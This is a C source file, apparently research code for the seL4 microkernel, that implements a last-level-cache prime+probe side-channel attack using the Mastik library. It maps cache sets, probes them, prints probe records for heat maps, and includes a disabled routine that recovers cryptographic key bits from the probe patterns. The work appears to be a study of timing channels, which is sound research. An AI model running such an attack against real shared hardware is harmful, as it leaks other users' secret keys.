#include <autoconf.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <stdio.h>
#include <stdint.h>
#include <assert.h>
#include <stdlib.h>
#include <string.h>
#include <sel4/sel4.h>
#include "vlist.h"
#include "cachemap.h"
#include "pp.h"
#include "../mastik_common/low.h"

#define SIZE (16*1024*1024)

#define RECORDLEN 100000
#define SLOT 5000

#define SEARCHLEN 1000


#if 0
 // Ivy Bridge (gdi.cs.adelaide.edu.au
static const char mask[] = ".........@@@@@@.........";
#define ALLOWEDMISSES 1
#define GAPLEN 200
#define SPLIT 23
#endif

 // Sandy Bridge (sandy)
static const char mask[] = ".....@@@@@@.....";
#define ALLOWEDMISSES 2
#define GAPLEN 200 
#define SPLIT 15

char record[RECORDLEN + 1];

typedef enum {
    st_zero,
    st_one,
    st_onezero,
    st_oneone,
    st_oneonezero
  }  state_t;


struct cachemap *cm_linelist(vlist_t lines);

static int a;

static char *findstart(char *record) {
  int len = 0;
  while (*record) {
    switch (*record) {
    case '@':
      if (len >= GAPLEN)
	return record;
      len = 0; 
      break;
    default: len++; break;
    }
    record++;
  }
  return NULL;
}

static void findend(char *record) {
  int len = 0;
  while (*record) {
    switch (*record) {
    case '@':
      len = 0; 
      break;
    default: 
      len++; 
      if (len == GAPLEN) {
	record[-GAPLEN] = '\0';
	return;
      }
      break;
    }
    record++;
  }
}

static void histogram(char *record, int hist[], int max) {
  int len = 0;
  for (int i = 0; i < max; i++)
    hist[i] = 0;
  record++;
  while (*record) {
    switch (*record) {
    case '@':
      if (len >= max)
	len = max-1;
      hist[len]++;
      len = 0; 
      break;
    default: 
      len++; 
      break;
    }
    record++;
  }
}

static void parse(char *record) {
  int len = 0;
  int lens[100];
  printf("Key bits: 1");
  for (int i = 0; i < 100; i++)
    lens[i] = 0;
  record++;
  while (*record) {
    switch (*record) {
    case '@':
      putchar(len < SPLIT ? '0' : '1');
      if (len > 99)
	len = 99;
      lens[len]++;
      len = 0; 
      break;
    default: 
      len++; 
      break;
    }
    record++;
  }
  putchar('\n');
  /*
  for (int i = 0; i < 100; i++) 
    if (lens[i] != 0)
      printf("%2d: %4d\n", i, lens[i]);
  */
}




static void cleanup(char *record) {
  state_t state = st_zero;
  while (*record) {
    switch (state) {
    case st_zero:
      if (*record == '@')
	state = st_one;
      break;
    case st_one:
      state = *record == '@' ? st_oneone : st_onezero;
      *record = '.';
      break;
    case st_onezero:
      if (*record == '@') {
	state = st_oneone;
      } else {
	state = st_zero;
	record[-2] = '.';
      }
      break;
    case st_oneone:
      if (*record != '@')
	state = st_oneonezero;
      *record = '.';
      break;
    case st_oneonezero:
      state = *record == '@' ? st_oneone : st_zero;
      *record = '.';
      break;
    }
    record++;
  }
}



static int misses(const char *record, const char *mask) {
  int mismatch = 0;
  while (*mask != '\0') {
    mismatch += (*mask != *record);
    mask++;
    record += (*record != '\0');
  }
  return mismatch;
}

static int matchcount(const char *record, const char *match, int allowedmisses) {
  int matchcount = 0;
  for (int i = 0; i < RECORDLEN; i++) 
    if (misses(record + i, mask) <= allowedmisses)
      matchcount++;
  return matchcount;
}


static void sample(pp_t pp, char *record, int samplecount) {
  pp_prime(pp, 50);
  uint32_t p = rdtscp();
  /*a miss in the probing set represented by @, all hit is "."*/
  for (int i = 0; i < samplecount; i++) {
    //record[i] = pp_probe(pp) ? '@' : '.';
      record[i] = pp_probe(pp);
    do {
    } while (rdtscp() - p < SLOT);
    p = rdtscp();
  }
  /*return a string represnet the number of samples for that probe*/
  //record[samplecount] = '\0';
}


static cachemap_t map() {
  for (int i = 0; i < 1024*1024; i++)
    for (int j = 0; j < 1024; j++)
      a *=i+j;
  printf("%d\n", a);
  char *buf = (char *)mmap(NULL, SIZE + 4096 * 2, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
  if (buf == MAP_FAILED) {
    perror("mmap");
    exit(1);
  }
  /*making the buffer page aligned*/
  int buf_switch = (int) buf; 
  buf_switch &= ~(0xfff); 
  buf_switch += 0x1000; 
  buf = (char *) buf_switch; 
  printf("buffer %p\n", buf);


  cachemap_t cm;
  vlist_t candidates;
  candidates = vl_new();
  for (int i = 0; i < SIZE; i += 4096) 
    vl_push(candidates, buf + i);

  cm = cm_linelist(candidates);
  printf("Cachemap done: %d sets, %d unloved\n", cm->nsets, vl_len(candidates));
  //if (cm->nsets != 128 || vl_len(candidates) != 0) 
    //exit (1);
  return cm;

}

static void attack(cachemap_t cm) {
  pp_t *pps[256];

  int found = 0;
  for (int offset = 0; offset < 4096; offset += 64) {
  //for (int offset = 0xd00; offset < 0xe00; offset += 64) {
    for (int i = 0; i < cm->nsets; i++)
      pps[i] = pp_prepare(cm->sets[i], L3_ASSOCIATIVITY, offset);
    //printf("Trying offset 0x%03x\n", offset);
    for (int i = 0; i < cm->nsets; i++) {
      sample(pps[i], record, SEARCHLEN);

      /*print out the search record, using to generate heat maps
       may take 1 hour to run*/
      for (int z = 0; z < SEARCHLEN; z++)
          printf("%d ", record[z]);
      printf("\n");
#if 0
      //printf("%d[0x%03x] - %.300s\n", i, offset, record);
      int matches = matchcount(record, mask, ALLOWEDMISSES);
      if (matches > SEARCHLEN*2/strlen(mask)/3) {
          /*matches at the cache set with offset, probing record....*/
	printf("Match at %d[0x%03x]: %.150s\n", i, offset, record);
	sample(pps[i], record, RECORDLEN);
	if (matchcount(record, mask, ALLOWEDMISSES) < SEARCHLEN*2/strlen(mask)/3) {
	  printf("False positive\n");
	  continue;
	}
	cleanup(record);
	char *start = findstart(record);
	findend(start);
	int hist[100];
	histogram(start, hist, 100);
	int low = 0;
	int high = 0;
	for (int i = 0; i < SPLIT; i++) 
	  low += hist[i];
	for (int i = SPLIT; i < 100; i++) 
	  high += hist[i];
	if (low < 100) {
	  printf("False positive - not enough clear bits\n");
	  continue;
	}
	if (high < 100) {
	  printf("False positive - not enough set bits\n");
	  continue;
	}
        if (low + high < 2000 || low + high > 2100) {
	  printf("False positive - bad number of bits\n");
	  continue;
	}
	parse(start);
        found = 1;
      }
#endif
    }
  }
  //printf("Attack completed - %skey found\n", found ? "" : "no ");
}
#if 0
/*sandy bridge machine frequency 3.4GHZ*/
#define MASTIK_FEQ  (3400000000ull)

static void mastik_sleep(unsigned int sec) {

    unsigned long long s_tick = (unsigned long long)sec * MASTIK_FEQ;  
    unsigned long long cur, tar; 

    /*a self implmeneted sleep function*/
    cur = rdtscp_64(); 
    tar = cur + s_tick; 
    while (cur < tar) 
        cur = rdtscp_64(); 

}
#endif 

int mastik_spy(seL4_CPtr ep, char **av) {
//  extern unsigned int sleep(unsigned int seconds);
    seL4_Word badge;
    seL4_MessageInfo_t info;

    info = seL4_Recv(ep, &badge);
    assert(seL4_MessageInfo_get_label(info) == seL4_NoFault);


    cachemap_t cm = map();

    info = seL4_MessageInfo_new(seL4_NoFault, 0, 0, 1);
    seL4_SetMR(0, 0); 
    seL4_Send(ep, info);

 
  for (;;) {
    /*waiting on msg to start*/
      info = seL4_Recv(ep, &badge);
      assert(seL4_MessageInfo_get_label(info) == seL4_NoFault);

      printf("test start\n");
      attack(cm);

      info = seL4_MessageInfo_new(seL4_NoFault, 0, 0, 1);
      seL4_SetMR(0, 0); 
      seL4_Send(ep, info);

    //mastik_sleep(10);
  }
}



